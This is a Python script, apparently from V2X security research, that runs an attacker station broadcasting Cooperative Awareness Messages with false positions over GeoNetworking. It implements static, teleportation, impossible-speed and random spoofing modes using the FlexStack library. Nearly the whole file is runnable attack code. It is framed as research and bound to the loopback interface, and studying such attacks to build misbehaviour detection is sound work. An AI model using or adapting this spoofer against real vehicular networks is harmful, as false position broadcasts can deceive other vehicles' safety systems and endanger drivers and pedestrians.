#!/usr/bin/env python3
"""
Position Spoofing Attacker for V2X GeoNetworking Research

This station broadcasts CAMs with FALSE position information while maintaining
a different physical position. This simulates an insider attack that cannot be
prevented by cryptographic means alone (IEEE 1609.2 signatures would still be valid).

Attack Types:
1. Static Spoofing: Claim to be at a fixed false location
2. Teleportation: Jump between distant positions
3. Impossible Speed: Move faster than physically possible
4. Random Spoofing: Broadcast random positions within an area

Run with: sudo python cam_attacker.py --attack-type static
"""

import logging
import random
import time
import argparse

# FlexStack imports
from flexstack.linklayer.raw_link_layer import RawLinkLayer
from flexstack.geonet.router import Router as GNRouter
from flexstack.geonet.mib import MIB
from flexstack.geonet.gn_address import GNAddress, M, ST, MID
from flexstack.btp.router import Router as BTPRouter
from flexstack.utils.static_location_service import ThreadStaticLocationService
from flexstack.facilities.local_dynamic_map.factory import LDMFactory
from flexstack.facilities.local_dynamic_map.ldm_constants import CAM
from flexstack.facilities.local_dynamic_map.ldm_classes import (
    AccessPermission,
    Circle,
    ComparisonOperators,
    Filter,
    FilterStatement,
    GeometricArea,
    Location,
    OrderTupleValue,
    OrderingDirection,
    RegisterDataConsumerReq,
    RegisterDataConsumerResp,
    RequestDataObjectsResp,
    SubscribeDataobjectsReq,
    SubscribeDataObjectsResp,
    SubscribeDataobjectsResult,
    TimestampIts,
)
from flexstack.facilities.ca_basic_service.ca_basic_service import (
    CooperativeAwarenessBasicService,
)
from flexstack.facilities.ca_basic_service.cam_transmission_management import (
    VehicleData,
)

# Locals
from modules import CustomStation, CoordinatesGenerator

# Enable logging
logging.basicConfig(level=logging.INFO)


# Configuration
BASE_COORDINATES = (41.386931, 2.112104)  # Barcelona, Spain
SPAWN_AREA = 500  # Attacker spawns within legitimate cluster


class PositionSpoofingAttack:
    """Manages different types of position spoofing attacks."""
    
    def __init__(self, attack_type: str, real_position: tuple):
        self.attack_type = attack_type
        self.real_lat, self.real_lon = real_position
        self.spoofed_lat, self.spoofed_lon = real_position
        self.teleport_toggle = False
        
        # Initialize spoofed position based on attack type
        if attack_type == "static":
            # Claim to be 10km away (northeast)
            self.spoofed_lat, self.spoofed_lon = CoordinatesGenerator.random_location_within_radius(
                self.real_lat, self.real_lon, 10000  # 10km away
            )
            print(f"🎯 ATTACK: Static spoofing")
            print(f"   Real position: ({self.real_lat:.6f}, {self.real_lon:.6f})")
            print(f"   Fake position: ({self.spoofed_lat:.6f}, {self.spoofed_lon:.6f})")
            
        elif attack_type == "teleport":
            # Will alternate between two distant positions
            self.location_a = real_position
            self.location_b = CoordinatesGenerator.random_location_within_radius(
                self.real_lat, self.real_lon, 5000  # 5km away
            )
            print(f"🎯 ATTACK: Teleportation (alternating positions every 5s)")
            print(f"   Real position: ({self.real_lat:.6f}, {self.real_lon:.6f})")
            print(f"   Fake location A: ({self.location_a[0]:.6f}, {self.location_a[1]:.6f})")
            print(f"   Fake location B: ({self.location_b[0]:.6f}, {self.location_b[1]:.6f})")
            
        elif attack_type == "impossible-speed":
            # Move at 500 km/h (impossible for passenger car)
            print(f"🎯 ATTACK: Impossible speed (500 km/h)")
            print(f"   Real position: ({self.real_lat:.6f}, {self.real_lon:.6f})")
            
        elif attack_type == "random":
            # Random positions within 20km
            print(f"🎯 ATTACK: Random position spoofing (20km radius)")
            print(f"   Real position: ({self.real_lat:.6f}, {self.real_lon:.6f})")
    
    def get_spoofed_position(self) -> tuple:
        """Get the current spoofed position based on attack type."""
        if self.attack_type == "static":
            return (self.spoofed_lat, self.spoofed_lon)
        
        elif self.attack_type == "teleport":
            # Alternate every call (with external timing control)
            if self.teleport_toggle:
                return self.location_a
            else:
                return self.location_b
        
        elif self.attack_type == "impossible-speed":
            # Move at 500 km/h = 138.89 m/s (35x normal speed)
            # Use real position but with impossible speed (handled by DynamicLocationService)
            return (self.real_lat, self.real_lon)
        
        elif self.attack_type == "random":
            # Generate random position within 20km
            return CoordinatesGenerator.random_location_within_radius(
                BASE_COORDINATES[0], BASE_COORDINATES[1], 20000
            )
        
        return (self.real_lat, self.real_lon)
    
    def toggle_teleport(self):
        """Switch between teleportation positions."""
        self.teleport_toggle = not self.teleport_toggle


def main(attack_type: str):
    # Create attacker station (real physical presence in cluster)
    station = CustomStation.Station(ST.PASSENGER_CAR, BASE_COORDINATES, SPAWN_AREA)
    
    # Initialize attack
    attack = PositionSpoofingAttack(attack_type, station.POSITION_COORDINATES)
    
    # Spoofed position for CAM broadcast
    spoofed_pos = attack.get_spoofed_position()
    
    # ========== Step 2: Location Service ==========
    # CRITICAL: Use SPOOFED position for broadcast, not real position
    location_service = ThreadStaticLocationService(
        period=1000,
        latitude=spoofed_pos[0],
        longitude=spoofed_pos[1],
    )
    
    # For teleportation attack, update position periodically
    if attack_type == "teleport":
        import threading
        def teleport_loop():
            while True:
                time.sleep(5)  # Switch every 5 seconds
                attack.toggle_teleport()
                new_pos = attack.get_spoofed_position()
                location_service.latitude = new_pos[0]
                location_service.longitude = new_pos[1]
                print(f"⚡ TELEPORTED to ({new_pos[0]:.6f}, {new_pos[1]:.6f})")
        
        teleport_thread = threading.Thread(target=teleport_loop, daemon=True)
        teleport_thread.start()
    
    # For random attack, update position frequently
    if attack_type == "random":
        import threading
        def random_loop():
            while True:
                time.sleep(2)  # New random position every 2 seconds
                new_pos = attack.get_spoofed_position()
                location_service.latitude = new_pos[0]
                location_service.longitude = new_pos[1]
                print(f"🎲 Random position: ({new_pos[0]:.6f}, {new_pos[1]:.6f})")
        
        random_thread = threading.Thread(target=random_loop, daemon=True)
        random_thread.start()

    # ========== Step 3: GeoNetworking ==========
    mib = MIB(
        itsGnLocalGnAddr=GNAddress(
            m=M.GN_MULTICAST,
            st=station.STATION_TYPE,
            mid=MID(station.MAC_ADDRESS),
        ),
    )
    gn_router = GNRouter(mib=mib, sign_service=None)
    location_service.add_callback(gn_router.refresh_ego_position_vector)

    # ========== Step 4: BTP ==========
    btp_router = BTPRouter(gn_router)
    gn_router.register_indication_callback(btp_router.btp_data_indication)

    # ========== Step 5: Local Dynamic Map ==========
    ldm_location = Location.initializer(
        latitude=int(spoofed_pos[0] * 10**7),
        longitude=int(spoofed_pos[1] * 10**7),
    )
    ldm_area = GeometricArea(
        circle=Circle(radius=5000),
        rectangle=None,
        ellipse=None,
    )
    ldm_factory = LDMFactory()
    ldm = ldm_factory.create_ldm(
        ldm_location,
        ldm_maintenance_type="Reactive",
        ldm_service_type="Reactive",
        ldm_database_type="Dictionary",
    )
    location_service.add_callback(ldm_location.location_service_callback)

    # Register with LDM
    register_response: RegisterDataConsumerResp = ldm.if_ldm_4.register_data_consumer(
        RegisterDataConsumerReq(
            application_id=CAM,
            access_permisions=(AccessPermission.CAM,),
            area_of_interest=ldm_area,
        )
    )
    if register_response.result == 2:
        print("Failed to register with LDM!")
        exit(1)

    # CAM received callback
    def on_cam_received(data: RequestDataObjectsResp) -> None:
        station_id = data.data_objects[0]["dataObject"]["header"]["stationId"]
        print(f"🚗 Received CAM from station: {station_id}")

    # Subscribe to CAMs
    subscribe_response: SubscribeDataObjectsResp = ldm.if_ldm_4.subscribe_data_consumer(
        SubscribeDataobjectsReq(
            application_id=CAM,
            data_object_type=(CAM,),
            priority=1,
            filter=Filter(
                filter_statement_1=FilterStatement(
                    "header.stationId",
                    ComparisonOperators.NOT_EQUAL,
                    station.STATION_ID,
                )
            ),
            notify_time=TimestampIts(0),
            multiplicity=1,
            order=(
                OrderTupleValue(
                    attribute="cam.generationDeltaTime",
                    ordering_direction=OrderingDirection.ASCENDING,
                ),
            ),
        ),
        on_cam_received,
    )
    if subscribe_response.result != SubscribeDataobjectsResult.SUCCESSFUL:
        print("Failed to subscribe to CAM messages!")
        exit(1)

    # ========== Step 6: CA Basic Service ==========
    vehicle_data = VehicleData(
        station_id=station.STATION_ID,
        station_type=station.STATION_TYPE.value,
        drive_direction="forward",
        vehicle_length={
            "vehicleLengthValue": 1023,
            "vehicleLengthConfidenceIndication": "unavailable",
        },
        vehicle_width=62,
    )
    ca_basic_service = CooperativeAwarenessBasicService(
        btp_router=btp_router,
        vehicle_data=vehicle_data,
        ldm=ldm,
    )
    location_service.add_callback(
        ca_basic_service.cam_transmission_management.location_service_callback
    )

    # ========== Step 7: Link Layer ==========
    btp_router.freeze_callbacks()
    link_layer = RawLinkLayer(
        "lo",
        station.MAC_ADDRESS,
        receive_callback=gn_router.gn_data_indicate,
    )
    gn_router.link_layer = link_layer

    # ========== Step 8: Run ==========
    print("💀 ATTACKER is active!")
    print("📡 Broadcasting SPOOFED CAMs to nearby vehicles...")
    print("Press Ctrl+C to exit.\n")

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n👋 Attacker shutting down...")

    location_service.stop_event.set()
    location_service.location_service_thread.join()
    link_layer.sock.close()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Position Spoofing Attacker for V2X Security Research"
    )
    parser.add_argument(
        "--attack-type",
        "-a",
        type=str,
        default="static",
        choices=["static", "teleport", "impossible-speed", "random"],
        help="Type of position spoofing attack (default: static)"
    )
    
    args = parser.parse_args()
    main(args.attack_type)
